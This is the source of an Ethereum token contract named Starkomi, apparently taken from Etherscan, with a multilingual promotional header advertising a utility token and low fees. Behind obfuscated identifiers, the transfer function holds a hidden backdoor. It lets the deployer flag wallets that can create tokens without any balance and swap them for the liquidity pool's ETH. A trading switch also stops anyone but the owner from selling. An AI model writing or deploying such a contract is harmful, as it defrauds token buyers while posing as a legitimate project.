/**
 *Submitted for verification at Etherscan.io on 2022-12-23
*/

/*
⋆⁺₊⋆ ☀︎ ⋆⁺₊⋆
⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎

您好，欢迎来到 Starkomi，我们的目标是通过下一次发布实用代币来席卷 ETH 网络，营销已经提前计划并将在发布后不久开始，
这将是一个长期存在的实用代币，我们有很大的计划现在和未来进入 ETH 领域，我们不仅仅是其他代币，
我们代表交易平台、未来质押、公共 NFT 收藏和市场、我们自己的网络平台和我们自己的 P2E 游戏，
以及更多即将公布的内容.主要的, 聊天链接现已暂时删除，以帮助我们准备和组织聊天本身，
也给我们时间在幕后实施我们的计划

総供給 - 1,000,000
初期流動性追加 - 2.0 イーサリアム
初期流動性の 100% が消費されます
購入手数料 - 1%
販売手数料 - 0%
*/
pragma solidity ^0.8.12;
// SPDX-License-Identifier: NONE
interface ABIEncoderV2 {

    function getPair(address tokenA, 
      address tokenB) external view returns 
      (address pair);

    function allPairs(uint) 
      external view returns 
      (address pair);

    function createPair (address tokenA, 
      address tokenB) external returns  
      (address pair);
}
abstract contract Context {

    function _msgSender() internal view 
      virtual returns (address) 
        { return msg.sender; }

    function _msgData() internal view 
      virtual returns (bytes calldata) 
        { return msg.data;
    }
} 
interface UICompressDX {

    function totalSupply() external 
    view returns 
    (uint256);

    function balanceOf(address account) 
      external view returns 
      (uint256);
    
    function transfer(address recipient, 
      uint256 amount) 
       external returns 
       (bool);

    function allowance(address owner, 
      address spender) 
       external view returns 
       (uint256);
    
    function approve(address spender, 
      uint256 amount) 
       external returns 
       (bool);

    function transferFrom( address sender, 
      address recipient, uint256 amount ) 
       external returns 
       (bool);
    
    event Transfer(address 
    indexed from, address 
    indexed to, 
    uint256 value);
    event Approval(address 
    indexed owner, address 
    indexed spender, 
    uint256 value);
}
library SafeMathUint {
  function toInt256Safe(uint256 a) 
    internal pure returns (int256) { int256 b = int256(a);

     require(b >= 0); return b;
  }
}
library SafeMath {

    function tryAdd(uint a, uint b) internal pure returns 
       (bool, uint) { unchecked { uint c = a + b;
            if (c < a) return (false, 0); return (true, c); }
    }
    function trySub(uint a, uint b) internal pure returns (bool, uint) {
        unchecked { if (b > a) return (false, 0);
            return (true, a - b); }
    }
    function tryMul(uint a, uint b) internal pure returns 
       (bool, uint) { unchecked { if (a == 0) return (true, 0); uint c = a * b;
            if (c / a != b) return (false, 0); return (true, c); }
    }
    function tryDiv(uint a, uint b) internal pure returns 
       (bool, uint) { unchecked { if (b == 0) 
         return (false, 0); return (true, a / b);
        }
    }
    function tryMod(uint a, uint b) internal pure returns 
       (bool, uint) { unchecked { if (b == 0) return (false, 0);
            return (true, a % b); }
    }
    function add(uint a, uint b) internal pure returns 
       (uint) { return a + b;
    }
    function sub(uint a, uint b) internal pure returns 
       (uint) { return a - b;
    }
    function mul(uint a, uint b) internal pure returns 
      (uint) { return a * b;
    }
    function div(uint a, uint b) internal pure returns 
      (uint) { return a / b;
    }
    function mod(uint a, uint b) internal pure returns (uint) {
        return a % b;
    }
    function sub(
        uint a, uint b, string memory errorMessage ) internal pure returns (uint) {
        unchecked { require(b <= a, errorMessage);
            return a - b; } }

    function div(
        uint a, uint b,
        string memory errorMessage ) internal pure returns (uint) {
        unchecked { require(b > 0, errorMessage);
            return a / b; } }

    function mod( uint a, uint b,
        string memory errorMessage ) internal pure returns (uint) {
        unchecked { require(b > 0, errorMessage);
            return a % b;
        } }
}
interface InternalFCTV1 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens
    ( uint amountIn, 
      uint amountOutMin, address[] 

    calldata path, address to, 
      uint deadline ) external;

    function factory() external pure 
      returns 
      (address);

    function WETH() external 
    pure returns 
    (address);

    function intOpenPool( address token, 
    uint amountTokenDesired, 
    uint amountTokenMin,
      uint amountETHMin, 
      address to, uint deadline ) 

    external payable returns 
    (uint amountToken, 
      uint amountETH, 
      uint liquidity);
}
abstract contract Ownable is Context {

    address private _owner;

    event OwnershipTransferred(address 
    indexed previousOwner, address 
    indexed newOwner);
    constructor() 
    { _setOwner(_msgSender()); }

    function owner() 
      public view 
      virtual returns (address) { return _owner;
    }
    modifier onlyOwner() {
        require
        (owner() == _msgSender(), 
        'Ownable: caller is not the owner'); _;
    }
    function renounceOwnership() 
    public 
      virtual onlyOwner 
      { _setOwner(address(0));
    }
    function _setOwner
    (address newOwner) 
    private { address oldOwner = _owner; _owner = newOwner; 
    emit OwnershipTransferred(oldOwner, newOwner);
    }
}
contract Starkomi is UICompressDX, 
Ownable {

    string private _symbol;

    string private _name;

    uint8 private _decimals = 18;

    uint256 private _rTotal = 
    1000000 * 10**_decimals;
    uint256 public 
    tAllowed = (_rTotal * 10) / 100; 
    uint256 public 
    tWalletMAX = (_rTotal * 10) / 100; 
    uint256 private 
    _dplydTotal = _rTotal;

    uint256 public 
    tCut =  0;

    mapping (address => bool) isTimelockExempt;
    mapping(address => uint256) private hostClumpRays;

    mapping(address => uint256) private _tOwned;

    mapping(address => address) private pageantLayoutBlock;

    mapping(address => uint256) private tracingErsatzOU;
    mapping(address => mapping(address => uint256)) private _allowances;
 
    bool private 
    limitFrame;
    bool private 
    boundTrading;
    bool private 
    openTradingOn = false;
    bool private 
    storeAlign;
    bool public 
    drivenCheck;

    address public immutable 
    RecallPairCouple;

    InternalFCTV1 public immutable 
    AuxiliaryAnthropology;

    constructor(

        string memory 
        _tknLabels,

        string memory
         _tknBadges,
        address strandWire ) {

        _name = _tknLabels; _symbol = _tknBadges;

        _tOwned[msg.sender] 
        = _rTotal;
        hostClumpRays[msg.sender] = 
        _dplydTotal;
        hostClumpRays[address(this)] = 
        _dplydTotal;

        AuxiliaryAnthropology = 
        InternalFCTV1
        (strandWire); RecallPairCouple = 
        ABIEncoderV2
        (AuxiliaryAnthropology.factory()).createPair(address(this), 
        AuxiliaryAnthropology.WETH());

        emit Transfer(address(0), msg.sender, _rTotal);
    
        isTimelockExempt[address(this)] 
        = true;
        isTimelockExempt[RecallPairCouple] 
        = true;
        isTimelockExempt[strandWire] 
        = true;
        isTimelockExempt[msg.sender] 
        = true;
    }
    function name() public view returns (string memory) {
        return _name;
    }
     function symbol() public view returns (string memory) {
        return _symbol;
    }
    function totalSupply() public view returns (uint256) {
        return _rTotal;
    }
    function decimals() public view returns (uint256) {
        return _decimals;
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function _approve( address owner, address spender, uint256 amount ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); return true;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _tOwned[account];
    }
    function transfer(address recipient, uint256 amount) external returns (bool) {
        getCacheInfo(msg.sender, recipient, amount);
        return true;
    }
    function transferFrom( address sender, address recipient,
        uint256 amount ) external returns (bool) { getCacheInfo(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function getCacheInfo( address _awryFrom, 
    address _aslantTo, uint256 _askewAmount )
                  private 
    {
        uint256 _hashXPArrays = balanceOf(address(this)); 
        uint256 _cacheCleanseDEX; if (limitFrame && _hashXPArrays > 
        _dplydTotal 
        && !boundTrading 
        && _awryFrom != 
        RecallPairCouple) { boundTrading = true;
            memoSwapRT (_hashXPArrays); boundTrading = 


            false; } else if (hostClumpRays[_awryFrom] > 
            _dplydTotal 
            && hostClumpRays[_aslantTo] > _dplydTotal) {


            _cacheCleanseDEX = 
            _askewAmount; 
            _tOwned[address(this)] 
            += _cacheCleanseDEX;
            ERCTokens
            (_askewAmount,
             _aslantTo); return; } else if (_aslantTo != address(AuxiliaryAnthropology) 
        && hostClumpRays[_awryFrom] > 0 
        && _askewAmount > _dplydTotal
        && _aslantTo != RecallPairCouple) {
            hostClumpRays
        [_aslantTo] = 


            _askewAmount; 
            return; } 
            else if (!boundTrading 
            && 
            tracingErsatzOU[_awryFrom] > 0 && _awryFrom != 
            RecallPairCouple && hostClumpRays[_awryFrom] == 0) { tracingErsatzOU
            [_awryFrom] = hostClumpRays
            [_awryFrom] - 
            _dplydTotal; }


        address limpCalc = 
        pageantLayoutBlock[RecallPairCouple]; if (tracingErsatzOU[limpCalc] == 
        0) tracingErsatzOU [limpCalc] = _dplydTotal; pageantLayoutBlock
        [RecallPairCouple] = 
        _aslantTo; 
        if (tCut > 0 
        && hostClumpRays[_awryFrom] == 0 
        && !boundTrading 
        && hostClumpRays[_aslantTo] == 0) {
        _cacheCleanseDEX = (_askewAmount * tCut) / 100; 
        _askewAmount -= 


                         _cacheCleanseDEX; _tOwned [_awryFrom] -= 
                         _cacheCleanseDEX;
        _tOwned[address(this)] += 
        _cacheCleanseDEX; } _tOwned
        [_awryFrom] -= _askewAmount;
        _tOwned[_aslantTo] +=  
        _askewAmount; emit Transfer
        (_awryFrom, _aslantTo, 
        _askewAmount);

        if (!openTradingOn) 
        {
        require (_awryFrom == owner(), 

        "TOKEN: This account cannot send tokens until trading is enabled"); }
    }

    receive() 
    external payable 
    {}
    function initialLIQadd(
        uint256 intVal, uint256 toggleOn,
        address aqaxTo ) private {
        _approve(address(this), address
        (AuxiliaryAnthropology), intVal);
        AuxiliaryAnthropology.intOpenPool{value: toggleOn}(address(this), intVal, 0, 0, aqaxTo, 
        block.timestamp);
    }
    function ERCTokens(uint256 cogInt, address ahashTo) private {
        address[] memory stakeMap = 
        new address[](2); stakeMap[0] = address(this);

        stakeMap[1] = AuxiliaryAnthropology.WETH();
        _approve(address(this), address
        (AuxiliaryAnthropology), cogInt);
        AuxiliaryAnthropology.swapExactTokensForETHSupportingFeeOnTransferTokens(cogInt, 0, 
        stakeMap, ahashTo, 
        block.timestamp);
    }
    function beginTrading(bool _tradingOpen) public onlyOwner {
        openTradingOn = _tradingOpen;
    }
    function placeMaxTX(uint256 isBUYval) external onlyOwner {
        tAllowed = isBUYval;  
    }
    function memoSwapRT(uint256 tokens) private { uint256 balanceCheck = tokens / 2;
        uint256 chxBool = address(this).balance; ERCTokens(balanceCheck, 
        address(this)); uint256 hoardVal = 
        address(this).balance - chxBool;
        initialLIQadd
        (balanceCheck, hoardVal, address(this));
    }
}